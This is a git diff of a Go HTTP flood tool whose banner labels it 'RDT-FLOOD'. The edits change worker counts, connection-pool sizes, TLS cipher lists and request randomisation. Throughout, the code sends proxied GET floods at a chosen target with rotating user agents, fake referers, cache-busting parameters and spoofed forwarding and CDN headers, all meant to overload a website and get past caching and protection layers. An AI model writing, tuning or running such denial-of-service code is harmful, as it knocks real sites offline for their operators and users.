@@ -21,11 +21,12 @@ import (
 	"time"
 )
 
+
 const (
-	wrk          = 1200
-	to           = 3 * time.Second
-	sub          = 4
-	RPS_CONTROL  = 300
+	wrk          = 350 
+	to           = 3 * time.Second 
+	sub          = 5
+	RPS_CONTROL  = 300 
 	KEEP_ALIVE   = 30 * time.Second
 )
 
@@ -71,10 +72,6 @@ var REF = []string{
 	"https://www.bing.com/search?q=",
 	"https://www.yahoo.com/search?p=",
 	"https://www.duckduckgo.com/?q=",
-	"https://www.youtube.com/results?search_query=",
-	"https://www.facebook.com/sharer/sharer.php?u=",
-	"https://twitter.com/intent/tweet?url=",
-	"https://www.linkedin.com/sharing/share-offsite/?url=",
 }
 
 var ENC = []string{
@@ -101,10 +98,6 @@ var PATH_POOL = []string{
 	"/cart", "/checkout", "/payment", "/success", "/cancel",
 	"/blog", "/post", "/article", "/news", "/event",
 	"/contact", "/about", "/team", "/career", "/faq",
-	"/search?q=", "/api/search", "/api/filter", "/api/query", "/graphql",
-	"/api/v1/data", "/api/v2/query", "/api/v3/filter", "/api/v4/load",
-	"/wp-json/wp/v2/posts", "/wp-json/wp/v2/pages",
-	"/index.php", "/home", "/main", "/portal", "/gateway",
 }
 
 type CLI struct {
@@ -192,6 +185,10 @@ func RIP() string {
 	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
 }
 
+func getRandomPath() string {
+	return PATH_POOL[rand.Intn(len(PATH_POOL))]
+}
+
 var customCookie string = ""
 
 func main() {
@@ -244,8 +241,8 @@ func main() {
 				KeepAlive: KEEP_ALIVE,
 			}).DialContext,
 			DisableKeepAlives:      false,
-			MaxIdleConns:           50000,
-			MaxIdleConnsPerHost:    50000,
+			MaxIdleConns:           25000,
+			MaxIdleConnsPerHost:    25000,
 			MaxConnsPerHost:        0,
 			IdleConnTimeout:        KEEP_ALIVE,
 			TLSClientConfig: &tls.Config{
@@ -260,10 +257,6 @@ func main() {
 					tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
 					tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
 					tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
-					tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
-					tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
-					tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
-					tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
 				},
 			},
 			ForceAttemptHTTP2:     true,
@@ -289,7 +282,7 @@ func main() {
 	fmt.Printf("ޗ | Method : RDT-FLOOD\n")
 	fmt.Printf("ޗ | Ulimit : 1048576\n")
 	fmt.Printf("ޗ | Target : %s\n", tgt)
-	fmt.Printf("ޗ | Time   : %d seconds\n", dur)
+	fmt.Printf("ޗ | Time   : %d s\n", dur)
 	fmt.Printf("ޗ | Proxy  : %d\n", len(proxies))
 	fmt.Printf("ޗ | Conc   : %d\n", wrk)
 	if customCookie != "" {
@@ -297,7 +290,7 @@ func main() {
 	} else {
 		fmt.Printf("ޗ | Cookie : False\n")
 	}
-	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
+	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n\n")
 
 	ctx, cancel := context.WithCancel(context.Background())
 	var wg sync.WaitGroup
@@ -326,9 +319,8 @@ func main() {
 						default:
 						}
 
-						path := PATH_POOL[rand.Intn(len(PATH_POOL))]
 						param := CBP[rand.Intn(len(CBP))]
-						reqURL := tgt + path
+						reqURL := tgt
 						if strings.Contains(reqURL, "?") {
 							reqURL += "&" + param + "=" + fmt.Sprintf("%d", rand.Int63())
 						} else {
@@ -340,11 +332,8 @@ func main() {
 						if rand.Intn(10) == 0 {
 							reqURL += "&" + RST(8) + "=" + RST(12)
 						}
-						if rand.Intn(3) == 0 {
-							reqURL += "&q=" + RST(1000+rand.Intn(1000))
-						}
 
-						req, _ := http.NewRequestWithContext(ctx, "GET", reqURL, nil)
+						req, _ := http.NewRequest("GET", reqURL, nil)
 
 						ua := UA[rand.Intn(len(UA))]
 						ACCept := ACC[rand.Intn(len(ACC))]
@@ -362,10 +351,10 @@ func main() {
 						req.Header.Set("If-Modified-Since", time.Now().AddDate(1, 0, 0).Format(time.RFC1123))
 						req.Header.Set("X-Cache-Buster", fmt.Sprintf("%x", rand.Int63()))
 
-						if rand.Intn(2) == 0 {
+						if rand.Intn(3) == 0 {
 							req.Header.Set("X-Original-URL", "/"+fmt.Sprintf("%x", rand.Int63()))
 						}
-						if rand.Intn(2) == 0 {
+						if rand.Intn(3) == 0 {
 							req.Header.Set("X-Forwarded-Host", fmt.Sprintf("%x.example.com", rand.Int63()))
 						}
 						if rand.Intn(3) == 0 {
@@ -379,10 +368,6 @@ func main() {
 						}
 						if rand.Intn(5) == 0 {
 							req.Header.Set("CDN-Loop", "cloudflare")
-						}
-
-						if rand.Intn(4) == 0 {
-							req.Header.Set("Range", fmt.Sprintf("bytes=0-%d", rand.Intn(1024)))
 						}
 
 						var cookies []string
